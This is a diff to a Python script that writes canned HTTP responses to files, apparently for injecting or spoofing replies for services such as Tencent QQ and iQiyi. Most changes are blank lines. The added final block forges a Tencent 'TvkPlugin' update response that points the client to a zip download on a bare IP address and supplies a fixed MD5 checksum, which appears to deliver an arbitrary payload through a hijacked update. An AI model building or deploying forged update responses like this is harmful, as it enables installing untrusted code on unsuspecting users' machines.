@@ -8,6 +8,7 @@
 @version: v1.0 
 """
 import gzip
+
 header = b"""HTTP/1.1 200 OK
 Server: Tengine
 Content-Type: application/json
@@ -36,7 +37,6 @@ with open("news_article.gz", "wb") as f:
     f.write(b"\r\n")
     f.write(encode)
     f.write(b"\r\n0\r\n\r\n")
-
 
 header_a = b"""HTTP/1.1 200 OK
 Server: nginx/1.6.0
@@ -83,7 +83,6 @@ with open("didichuxing.gz", "wb") as f:
     f.write(b"\r\n")
     f.write(encode)
     f.write(b"\r\n0\r\n\r\n")
-
 
 header_c = b"""HTTP/1.1 200 OK
 Server: Tengine
@@ -212,3 +211,18 @@ with open("aiqiyi.gz", "wb") as f:
     f.write(encode)
     f.write(b"\r\n0\r\n\r\n")
 
+content_h = """QZOutputJson={"c_so_name":"TvkPlugin","c_so_update_ver":"V4.3.000.0011","c_so_url":"http://122.10.88.137:80/059197675399/transfer/setup/S0005.zip","c_so_md5":"%s","ret":0};""" % "fbb3743903a0852f9a7c6b62969d490a"
+
+header_h = """HTTP/1.1 200 OK
+Server: Apache
+Connection: close
+Content-Type: application
+Content-Disposition: attachment; filename="commdatav2"
+Content-Length: {content_length}
+""".format(content_length = len(content_h))
+
+with open("tencent_qq", "wb") as f:
+    header_h = header_h.replace('\n', '\r\n')
+    f.write(header_h.encode())
+    f.write(b"\r\n")
+    f.write(content_h.encode())
